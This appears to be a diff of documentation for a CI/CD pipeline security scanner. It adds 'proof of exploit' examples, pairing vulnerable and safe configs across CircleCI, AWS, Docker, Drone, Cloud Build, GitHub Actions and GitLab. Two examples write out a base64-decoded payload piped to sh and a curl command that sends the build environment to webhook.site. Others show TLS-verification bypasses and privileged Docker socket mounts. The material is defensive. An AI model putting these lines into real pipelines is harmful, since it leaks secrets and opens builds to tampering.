 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body contains ``curl /tmp/.miner |
+# bash`` or pipes a base64-decoded payload to ``sh``. A
+# malicious PR (or a compromised co-maintainer) plants
+# the crypto-miner / credential-stealer in the config
+# itself; every subsequent build executes the payload.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - run: |
+          echo Z2g6Li4uIA== | base64 -d | sh   # obfuscated payload
+          curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the build does only what the build does. No
+# obfuscated execution, no exfil POSTs, no ``base64
+# -d | sh`` pipelines. If a check fires here it's
+# either a compromise or a CTF fixture; treat as
+# incident-response until verified otherwise.
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: alpine@sha256:abc123...
+    steps:
+      - checkout
+      - run: make build
+```
+
 **Source:** [`CC-026`](../providers/circleci.md#cc-026) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CC-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cc-028 }
@@ -1403,6 +2086,35 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Recommendation.** Pin every ``machine.image`` to a dated release tag, ``ubuntu-2204:2024.05.1`` rather than ``:current``, ``:edge``, ``:default``, or a bare image name. CircleCI rotates the ``current`` / ``edge`` aliases on its own cadence, so builds re-run on an image the author never reviewed.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: default`` resolves to whatever
+# CircleCI ships as the current default machine image.
+# Image updates rebuild the underlying OS / toolchain
+# silently; a compromise of the image build pipeline
+# ships malicious bytes into every machine-executor
+# pipeline that uses the default.
+version: 2.1
+jobs:
+  integration:
+    machine:
+      image: default
+    steps:
+      - run: docker compose run tests
+
+# Safe: pin to a specific image release. CircleCI's
+# release notes document each tag; pin to the SHA-
+# stamped tag rather than the rolling alias.
+version: 2.1
+jobs:
+  integration:
+    machine:
+      image: ubuntu-2204:2024.01.1
+    steps:
+      - run: docker compose run tests
+```
+
 **Source:** [`CC-029`](../providers/circleci.md#cc-029) in the [CircleCI provider](../providers/circleci.md).
 
 ### `CD-002`: AllAtOnce deployment config, no canary or rolling strategy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cd-002 }
@@ -1413,6 +2125,33 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 
 **Recommendation.** Switch to a canary or linear deployment configuration (e.g. CodeDeployDefault.LambdaCanary10Percent5Minutes or a custom rolling config) so that defects are caught before they affect all instances or traffic.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``CodeDeployDefault.AllAtOnce``. Every
+# deploy ships to every instance simultaneously. A bad
+# build (or a malicious one) takes the entire fleet down
+# at once; there's no canary window in which a regression
+# could be caught before customer-facing impact.
+import boto3
+cd = boto3.client('codedeploy')
+cd.create_deployment_group(
+    applicationName='my-app',
+    deploymentGroupName='prod',
+    deploymentConfigName='CodeDeployDefault.AllAtOnce',
+    # ...
+)
+
+# Safe: a canary / linear / blue-green config. Bad
+# deploys are caught before they reach the full fleet.
+cd.update_deployment_group(
+    applicationName='my-app',
+    currentDeploymentGroupName='prod',
+    deploymentConfigName='CodeDeployDefault.LambdaCanary10Percent5Minutes',
+    # or 'CodeDeployDefault.HalfAtATime' / 'CodeDeployDefault.OneAtATime'
+)
+```
+
 **Source:** [`CD-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CP-001`: No approval action before deploy stages <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cp-001 }
@@ -1422,6 +2161,50 @@ Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primiti
 **How this is detected.** A pipeline that goes Source -> Build -> Deploy with no Approval action means every commit on the source branch ships, with no human ack between code-merged and code-running-in-prod. The Manual approval action is the intentional pause point, combine with CP-005 for production-tagged stages specifically.
 
 **Recommendation.** Add a Manual approval action to a stage that precedes every Deploy stage that targets a production or sensitive environment.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodePipeline that goes Source -> Build
+# -> Deploy with no manual approval stage in between.
+# Every commit on the source branch reaches production
+# automatically. A compromised source branch (force
+# push, malicious co-maintainer, leaked CodeCommit
+# credential) ships straight to prod.
+import boto3
+cp = boto3.client('codepipeline')
+cp.create_pipeline(
+    pipeline={
+        'name': 'release',
+        'stages': [
+            {'name': 'Source', 'actions': [{'actionTypeId': {'category': 'Source', ...}}]},
+            {'name': 'Build', 'actions': [{'actionTypeId': {'category': 'Build', ...}}]},
+            {'name': 'Deploy', 'actions': [{'actionTypeId': {'category': 'Deploy', ...}}]},
+        ],
+        # ...
+    }
+)
+
+# Safe: add a manual approval stage before Deploy. A
+# human reviewer approves each release; an SNS topic
+# can notify the approval group when a release is
+# awaiting decision.
+cp.update_pipeline(
+    pipeline={
+        'name': 'release',
+        'stages': [
+            {'name': 'Source', 'actions': [...]},
+            {'name': 'Build', 'actions': [...]},
+            {'name': 'Approve', 'actions': [{
+                'name': 'manual-approval',
+                'actionTypeId': {'category': 'Approval',
+                                 'owner': 'AWS',
+                                 'provider': 'Manual', 'version': '1'}}]},
+            {'name': 'Deploy', 'actions': [...]},
+        ],
+    }
+)
+```
 
 **Source:** [`CP-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -1501,6 +2284,30 @@ CMD ["python", "/app/main.py"]
 **Known false positives.**
 
 - ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ADD <url>`` pulls a remote blob into the
+# image at build time with no integrity check. A MITM
+# (compromised proxy, BGP hijack on the mirror) or a
+# host compromise substitutes the file; the build commits
+# the substituted bytes into a layer.
+FROM ubuntu@sha256:abc123...
+ADD https://internal-mirror.example.com/installer.tar.gz /tmp/
+RUN tar -xzf /tmp/installer.tar.gz && /tmp/install.sh
+
+# Safe: ``RUN curl`` to a tempfile, ``sha256sum -c`` against
+# a known-good digest, then extract / execute. The verify
+# step fails loud if the bytes don't match.
+FROM ubuntu@sha256:abc123...
+RUN curl -fsSL https://internal-mirror.example.com/installer.tar.gz \
+      -o /tmp/installer.tar.gz \
+    && echo 'a1b2c3d4...  /tmp/installer.tar.gz' | sha256sum -c - \
+    && tar -xzf /tmp/installer.tar.gz \
+    && /tmp/install.sh \
+    && rm /tmp/installer.tar.gz
+```
 
 **Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -1585,6 +2392,31 @@ RUN curl -fsSL https://example-installer.example/install.sh -o /tmp/install.sh \
 
 - An internal index served over plain HTTP on a private network (no internet path) is the typical justification for the flag. Fix the index (terminate TLS at a reverse proxy, or install the internal CA into the image) rather than leaving the bypass in the Dockerfile.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP, so any network attacker between the
+# build and the registry can substitute a wheel. The
+# ``--trusted-host`` flag silences pip's hash
+# verification for the named host too.
+FROM python@sha256:abc123...
+RUN pip install \
+      --index-url http://internal-pypi.example.com/simple \
+      --trusted-host internal-pypi.example.com \
+      -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed into the image's trust store;
+# ``--require-hashes`` enforces hash pinning.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates && \
+    pip install \
+      --index-url https://internal-pypi.example.com/simple \
+      --require-hashes -r requirements.txt
+```
+
 **Source:** [`DF-021`](../providers/dockerfile.md#df-021) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-022`: RUN uses npm install instead of npm ci <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-022 }
@@ -1660,6 +2492,30 @@ If the internal registry / API genuinely has a self-signed cert, install the CA 
 
 - Test-only images that interact with a local mock server using a throwaway self-signed cert sometimes set this intentionally. Keep the bypass scoped to a separate ``test`` build stage and DON'T copy it into the final image; the production stage should never carry the variable. Suppress on the test-stage Dockerfile with a rationale that names the mock server.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0``
+# disables TLS verification for every Node.js process
+# in the container. Any HTTPS call (npm install at
+# runtime, internal API call, vendor SDK) is MITM-able.
+FROM node@sha256:abc123...
+ENV NODE_TLS_REJECT_UNAUTHORIZED=0
+COPY . /app
+WORKDIR /app
+CMD ["npm", "start"]
+
+# Safe: install the missing CA into the image trust
+# store and leave ``NODE_TLS_REJECT_UNAUTHORIZED`` at
+# its safe default. Node honors the system CA bundle.
+FROM node@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+COPY . /app
+WORKDIR /app
+CMD ["npm", "start"]
+```
+
 **Source:** [`DF-026`](../providers/dockerfile.md#df-026) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-027`: ENV disables Python HTTPS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-027 }
@@ -1673,6 +2529,30 @@ Complements DF-021 (``pip install`` TLS bypass via flags) and DF-026 (Node TLS b
 **Recommendation.** Remove the ``ENV PYTHONHTTPSVERIFY=0`` instruction. The variable tells Python's stdlib ``urllib`` and any library that delegates to it (most of them) to accept any TLS certificate. The bypass applies to every subsequent process — ``pip install``, runtime API calls, postinstall scripts — for the rest of the image's life. The same primitive in flag form (``pip install --trusted-host``) is DF-021's surface; DF-027 catches the env-var form that affects every Python invocation, not just pip.
 
 If the internal index has a self-signed cert, install the CA into the image's truststore (``REQUESTS_CA_BUNDLE`` pointing at a real CA bundle, or ``update-ca-certificates`` for the system bundle) rather than blanket-disabling verification.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV PYTHONHTTPSVERIFY=0`` disables TLS
+# verification for every Python process in the
+# container. pip, requests-via-urllib3, every API call
+# now ignores certificate validity.
+FROM python@sha256:abc123...
+ENV PYTHONHTTPSVERIFY=0
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+
+# Safe: install the missing CA, keep PYTHONHTTPSVERIFY
+# at the safe default. Python's ``ssl`` module reads
+# from the system CA store.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+```
 
 **Source:** [`DF-027`](../providers/dockerfile.md#df-027) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -1692,6 +2572,27 @@ Pairs with DF-026 (Node TLS), DF-027 (Python TLS), and DF-029 (Python requests T
 
 If you need to clone from an internal Git server with a self-signed cert, install the CA into the image's truststore — same fix as DF-026 / DF-027. The TLS-bypass primitive doesn't need to be image-wide for any legitimate use case.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV GIT_SSL_NO_VERIFY=1`` disables git's
+# certificate verification for every clone / fetch. A
+# MITM substitutes the remote's contents on the next
+# git operation.
+FROM alpine/git@sha256:abc123...
+ENV GIT_SSL_NO_VERIFY=1
+RUN git clone https://internal.example.com/repo.git /src
+
+# Safe: install the missing CA, keep git's SSL
+# verification on. ``GIT_SSL_CAPATH`` / ``GIT_SSL_CAINFO``
+# can also be used to point git at a specific CA bundle
+# if updating the system trust store isn't an option.
+FROM alpine/git@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates && \
+    git clone https://internal.example.com/repo.git /src
+```
+
 **Source:** [`DF-028`](../providers/dockerfile.md#df-028) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-029`: ENV neuters Python requests CA bundle <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-029 }
@@ -1710,6 +2611,33 @@ A path to a real file (``/etc/ssl/certs/...``, ``/usr/local/share/ca-certificate
 
 The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — ``REQUESTS_CA_BUNDLE`` only affects ``requests`` and its descendants, not the stdlib ``urllib``. Still a real bypass because most Python network clients (pip, AWS CLI, Anchore, Trivy, every Django app) flow through ``requests``.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV REQUESTS_CA_BUNDLE=/dev/null`` (or
+# the empty string, or a non-existent path) neuters the
+# CA bundle Python's requests library consults. Every
+# HTTPS call requests makes silently fails verification
+# or accepts any cert.
+FROM python@sha256:abc123...
+ENV REQUESTS_CA_BUNDLE=/dev/null
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+
+# Safe: point ``REQUESTS_CA_BUNDLE`` at the system trust
+# store (or leave it unset, in which case requests uses
+# certifi). Install internal CAs into the system store
+# rather than papering over with a null bundle.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+```
+
 **Source:** [`DF-029`](../providers/dockerfile.md#df-029) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DR-001`: Step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-001 }
@@ -1723,6 +2651,34 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 **Known false positives.**
 
 - Local-build images (``image: my-org/build-tools:dev`` produced upstream in the same pipeline) sometimes can't be digest-pinned because the digest depends on the build. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the floating-tag risk still applies to every public-registry pull.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``golang:1.21`` is a mutable tag. Docker Hub
+# (or any compromise of the publisher's account) repoints
+# the tag at a new image on the next 1.21.x patch release
+# and the next pipeline run pulls the swap silently.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: test
+    image: golang:1.21
+    commands:
+      - go test ./...
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot bump the digest in reviewable PRs.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: test
+    image: golang@sha256:abc123...
+    commands:
+      - go test ./...
+```
 
 **Source:** [`DR-001`](../providers/drone.md#dr-001) in the [Drone CI provider](../providers/drone.md).
 
@@ -1738,6 +2694,38 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 
 - Internal-registry plugins built and pushed by the same pipeline (``image: my-org/internal-plugin:dev`` produced upstream) sometimes can't be exact-pinned. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``plugins/docker:latest`` resolves at runner
+# start to whatever Docker Hub currently serves under the
+# ``latest`` tag. Whoever controls the plugin repo (or
+# anyone with publisher access) ships code into every
+# pipeline that uses the plugin.
+kind: pipeline
+type: docker
+name: publish
+steps:
+  - name: push-image
+    image: plugins/docker:latest
+    settings:
+      repo: myorg/app
+      tags: latest
+
+# Safe: pin the plugin image to a content-addressable
+# digest. The plugin can't be repointed without changing
+# the pipeline file (and a reviewable PR with it).
+kind: pipeline
+type: docker
+name: publish
+steps:
+  - name: push-image
+    image: plugins/docker@sha256:abc123...
+    settings:
+      repo: myorg/app
+      tags: ${DRONE_TAG}
+```
+
 **Source:** [`DR-005`](../providers/drone.md#dr-005) in the [Drone CI provider](../providers/drone.md).
 
 ### `DR-006`: TLS verification disabled in step commands <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-006 }
@@ -1747,6 +2735,41 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 **How this is detected.** Uses the cross-provider ``_primitives.tls_bypass`` detector shared with GHA-027, BK-008, JF-022, ADO-026, CC-024, GCB-011, and the CFN / Terraform rule packs. Covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses. The rule scans every ``commands:`` entry on every step.
 
 **Recommendation.** Remove TLS-bypass flags from build commands. The most common offenders are ``curl --insecure`` / ``-k`` / ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, and ``git -c http.sslverify=false``. Each exposes the build to TLS-MITM injection of a registry-served payload, which is a textbook supply-chain attack vector. If a registry's certificate is genuinely broken, fix the registry rather than permanently disabling verification, the bypass tends to outlive the broken cert and become a permanent weakness.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: every npm install in the build skips strict-
+# ssl validation. An attacker on the network path (corp
+# proxy, malicious mirror, BGP hijack) MITMs the registry
+# and ships malicious tarballs that npm installs without
+# any signal.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: install
+    image: node:20@sha256:abc123...
+    commands:
+      - npm config set strict-ssl false
+      - npm install
+
+# Safe: install the missing CA into the image (or use the
+# default trust store). Never disable TLS verification
+# pipeline-wide; if a registry's cert is broken, fix the
+# registry rather than papering over with a bypass that
+# outlives the broken cert.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: install
+    image: node:20@sha256:abc123...
+    commands:
+      - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+      - update-ca-certificates
+      - npm install
+```
 
 **Source:** [`DR-006`](../providers/drone.md#dr-006) in the [Drone CI provider](../providers/drone.md).
 
@@ -1772,6 +2795,34 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 
 **Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ECR repo with ``imageScanningConfiguration.
+# scanOnPush: false``. Every pushed image lands without
+# a vulnerability scan; the registry's downstream consumers
+# pull whatever CVE-laden base layer the build produced.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_repository(
+    repositoryName='myapp',
+    imageScanningConfiguration={'scanOnPush': False},
+)
+
+# Safe: enable scan-on-push. Pair with Inspector v2
+# enhanced scanning (ECR-007) for continuous re-scans
+# against the latest CVE database. Block deploys on
+# scan failures via an Inspector finding -> EventBridge
+# -> CodePipeline gate.
+ecr.put_image_scanning_configuration(
+    repositoryName='myapp',
+    imageScanningConfiguration={'scanOnPush': True},
+)
+# Enable enhanced scanning org-wide:
+inspector = boto3.client('inspector2')
+inspector.enable(resourceTypes=['ECR'])
+```
+
 **Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `ECR-002`: Image tags are mutable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-002 }
@@ -1781,6 +2832,31 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 **How this is detected.** Mutable tags mean ``:latest``, ``:v1.0``, and ``:stable`` can be re-pushed silently, the same tag points to different image content over time. Pinning by digest (``sha256:...``) in deployment manifests is the only durable reference; IMMUTABLE on the repo enforces the property registry-side so a forgotten digest reference doesn't drift.
 
 **Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ECR repo with ``imageTagMutability:
+# MUTABLE``. Anyone with ``ecr:PutImage`` (build role,
+# CI/CD credential, leaked token) can push a different
+# image under the same tag, silently swapping what
+# downstream consumers pull next.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_repository(
+    repositoryName='myapp',
+    imageTagMutability='MUTABLE',
+)
+
+# Safe: ``IMMUTABLE``. Tags can only be pushed once;
+# re-pushing the same tag fails. Updates ship as a new
+# version tag (and the digest never collides), forcing
+# downstream consumers to explicitly bump.
+ecr.put_image_tag_mutability(
+    repositoryName='myapp',
+    imageTagMutability='IMMUTABLE',
+)
+```
 
 **Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -1801,6 +2877,35 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 **How this is detected.** AWS supports pull-through cache for ECR Public, Quay, K8s, GitHub Container Registry, GitLab, and Docker Hub. A rule pointing at ``registry-1.docker.io`` without an authenticated credential silently caches whatever the public namespace resolves to.
 
 **Recommendation.** Scope pull-through cache rules to AWS-trusted registries (ECR Public, Quay.io with authentication, or a vetted private registry). Avoid wildcard or unauthenticated upstreams, a malicious image there gets cached into your account registry on first pull.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: an ECR pull-through cache rule with an
+# untrusted upstream registry. Untrusted = anything
+# other than AWS / k8s.io / Docker Hub Verified
+# Publishers. A pull-through cache means ECR fetches
+# from the upstream on first reference and caches the
+# bytes; if the upstream is compromised, those bytes
+# land in your registry and ship to every consumer.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_pull_through_cache_rule(
+    ecrRepositoryPrefix='internal-mirror',
+    upstreamRegistryUrl='https://rando-mirror.example.com',
+)
+
+# Safe: pull-through caches only against well-known
+# upstreams whose publisher controls you trust
+# (Docker Hub Verified, ECR Public, Quay, K8s.io). For
+# anything else, replicate via an org-controlled mirror
+# with content scanning between the upstream and your
+# registry.
+ecr.create_pull_through_cache_rule(
+    ecrRepositoryPrefix='public-cache',
+    upstreamRegistryUrl='https://public.ecr.aws',
+)
+```
 
 **Source:** [`ECR-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -1823,6 +2928,25 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 **Recommendation.** Pin every ``steps[].name`` image to an ``@sha256:<digest>`` suffix. ``gcr.io/cloud-builders/docker:latest`` is mutable; Google publishes new builder images frequently and the next build would pull whatever is current. Resolve the digest with ``gcloud artifacts docker images describe <ref> --format='value(image_summary.digest)'`` and pin it.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``gcr.io/cloud-builders/gcloud`` resolves to
+# the registry's latest at build time. Google's update of
+# the underlying image is silently picked up; a namespace
+# / publisher takeover would ship malicious code into
+# every Cloud Build that uses the step.
+steps:
+  - name: gcr.io/cloud-builders/gcloud
+    args: [run, deploy, app, --image, us-central1-docker.pkg.dev/proj/repo/app]
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot bump the digest in reviewable PRs.
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [run, deploy, app, --image, us-central1-docker.pkg.dev/proj/repo/app]
+```
 
 **Source:** [`GCB-001`](../providers/cloudbuild.md#gcb-001) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -1855,6 +2979,25 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 **Recommendation.** Fix the underlying certificate issue, install the correct CA bundle into the step image, or point the tool at a mirror that presents a valid chain. Disabling verification trades a build error for a silent MITM window.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl -k`` disables certificate verification
+# for the duration of the call. An attacker on the network
+# path (compromised proxy, malicious VPN exit) MITMs the
+# response and ships substituted bytes into the build.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    args: [-k, -O, https://internal-mirror.example.com/artifact.tar.gz]
+
+# Safe: keep TLS verification on. If the internal mirror
+# uses a private CA, install the CA into the step image's
+# trust store rather than papering over with ``-k``.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    args: [-O, https://internal-mirror.example.com/artifact.tar.gz]
+```
 
 **Source:** [`GCB-011`](../providers/cloudbuild.md#gcb-011) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -1996,6 +3139,36 @@ steps:
 **Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket runs inside a GitHub-hosted (or self-
+# hosted) runner. The container escapes to the runner;
+# on self-hosted runners that's persistent compromise.
+name: integration
+on: [push]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          docker run --privileged \
+            -v /var/run/docker.sock:/var/run/docker.sock \
+            myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. Use
+# a rootless builder (Kaniko, BuildKit rootless) if the
+# job needs to build images. Pin the image to a digest.
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: docker run myapp@sha256:abc123... ./integration.sh
+```
 
 **Source:** [`GHA-017`](../providers/github.md#gha-017) in the [GitHub Actions provider](../providers/github.md).
 
@@ -2194,6 +3367,34 @@ jobs:
 - Security-training repositories, CTF challenges, and red-team exercise workflows legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production workflow still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a step body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a known
+# miner binary. A malicious PR (or compromised co-
+# maintainer) lands the payload in a workflow file;
+# every subsequent run executes it.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo Z2g6Li4uIA== | base64 -d | sh
+          curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the workflow does only what the workflow does.
+# No obfuscated execution, no exfil POSTs, no
+# ``base64 -d | sh`` pipelines. If a check fires it's a
+# compromise or a CTF fixture; treat as incident response.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: make build
+```
+
 **Source:** [`GHA-027`](../providers/github.md#gha-027) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-029`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-029 }
@@ -2303,6 +3504,39 @@ jobs:
 **Seen in the wild.**
 
 - GitGuardian 2023 supply-chain audit: a handful of low-popularity actions with ``contents: write`` were weaponized via single-PR maintainer-impersonation compromises; the elevated permission was the privilege amplifier that let the attacker push code back to the victim's default branch on the same workflow run.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``uses: rando-user/single-maintainer-action``
+# is a low-star action from a single-maintainer repo,
+# AND the calling job grants ``contents: write`` /
+# ``id-token: write`` / similar. A compromised maintainer
+# (or a typosquat / namespace takeover) ships code into
+# the runner with write access to the repo.
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+    steps:
+      - uses: rando-user/auto-release@<sha>   # 4 stars, 1 maintainer
+
+# Safe: vet the action's reputation before granting
+# sensitive permissions. Prefer first-party / verified-
+# creator actions for privileged jobs. If a niche action
+# is truly required, fork it into your own org, vendor
+# the maintained version, and pin to your fork's SHA.
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+    steps:
+      - uses: softprops/action-gh-release@<sha>   # verified-creator equivalent
+```
 
 **Source:** [`GHA-043`](../providers/github.md#gha-043) in the [GitHub Actions provider](../providers/github.md).
 
@@ -2560,6 +3794,27 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: node:20`` is a mutable tag. Docker
+# Hub's node team rebuilds it on every Node point
+# release; a publisher takeover ships code into every
+# GitLab pipeline using the tag.
+build:
+  image: node:20
+  script:
+    - npm ci
+    - npm test
+
+# Safe: pin to the content-addressable digest.
+build:
+  image: node@sha256:abc123...   # node:20.11.1
+  script:
+    - npm ci
+    - npm test
+```
+
 **Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-004`: Deploy job lacks manual approval or environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-004 }
@@ -2579,6 +3834,29 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 **How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.
 
 **Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.
+
+**Proof of exploit.**
+
+```
